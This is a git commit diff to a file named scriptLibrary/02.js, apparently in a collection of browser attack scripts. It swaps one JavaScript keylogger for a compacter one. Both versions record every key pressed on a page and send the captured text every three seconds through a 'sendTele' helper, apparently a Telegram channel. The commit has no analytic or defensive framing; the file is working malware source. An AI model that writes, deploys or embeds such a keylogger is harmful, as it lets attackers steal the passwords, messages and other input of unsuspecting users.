534cb75d0147dc9532bef3fd6cbf206e0d00c115
NOFACe-186 <rfxnoface186@gmail.com>
2026-03-26 22:56:08 +0600

    Add files via upload

--- scriptLibrary/02.js
+++ scriptLibrary/02.js
@@ -1,20 +1,9 @@
-
-let keylogData = "";
-document.addEventListener('keydown', function(e) {
-    let key = e.key;
-    if (key === "Enter") key = "\n[ENTER]\n";
-    else if (key === "Backspace") key = "[BS]";
-    else if (key === "Space") key = " ";
-    else if (key.length > 1) key = ` [${key}] `;
-    
-    keylogData += key;
-});
-
-
-setInterval(function() {
-    if (keylogData.length > 0) {
-        sendTele("⌨️ Keylog Captured:\n" + keylogData);
-        keylogData = ""; 
-    }
-}, 3000); 
-
+let log = "";
+document.onkeydown = (e) => {
+    let k = e.key || String.fromCharCode(e.keyCode);
+    if (k === "Enter") k = "\n[ENTER]\n";
+    else if (k === "Backspace") k = "[BS]";
+    else if (k === "Space") k = " ";
+    log += k;
+};
+setInterval(() => { if(log) { sendTele("⌨️ Keylog: " + log); log = ""; } }, 3000);
